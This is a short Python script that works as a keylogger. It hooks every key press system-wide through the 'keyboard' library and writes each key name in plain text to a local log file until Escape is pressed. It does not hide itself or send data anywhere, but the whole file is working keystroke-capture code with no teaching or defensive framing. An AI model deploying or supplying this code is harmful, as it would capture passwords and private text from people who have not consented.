import keyboard
import time
from datetime import datetime

# File to save the logged keystrokes
LOG_FILE = "keylog.txt"

def on_press(event):
    # Log the key pressed
    with open(LOG_FILE, "a") as f:
        f.write(f"{event.name}\n")

def main():
    print("Keylogger started. Press 'esc' to stop.")
    
    # Set up the keylogger
    keyboard.on_press(on_press)
    
    # Keep the program running until 'esc' is pressed
    keyboard.wait('esc')

    print("Keylogger stopped.")

if __name__ == "__main__":
    main()
